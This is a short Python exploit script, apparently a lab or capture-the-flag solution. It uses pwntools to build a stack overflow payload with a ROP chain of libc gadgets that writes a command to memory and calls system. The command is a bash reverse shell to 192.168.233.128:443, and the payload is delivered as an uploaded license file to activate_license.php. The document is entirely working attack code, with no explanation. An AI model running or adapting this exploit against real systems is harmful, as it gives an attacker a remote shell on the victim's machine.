#!/usr/bin/python3
from pwn import p64
import requests

offset = 520
junk = b"A" * offset

binary_base = 0x555555554000
libc_base = 0x7ffff7b56000

writable = binary_base + 0x4000

system = p64(libc_base + 0x48e50)
pop_rdi = p64(libc_base + 0x26796)
pop_rsi = p64(libc_base + 0x2890f)
mov_rdi_rsi = p64(libc_base + 0x603b2)

command = b"bash -c 'bash -i >& /dev/tcp/192.168.233.128/443 0>&1'"

payload =  b""
payload += junk

for i in range(0, len(command), 8):
    payload += pop_rdi + p64(writable + i)
    payload += pop_rsi + command[i:i+8].ljust(8, b"\x00")
    payload += mov_rdi_rsi

payload += pop_rdi + p64(writable)
payload += system

requests.post("http://localhost/activate_license.php", files={"licensefile": payload})
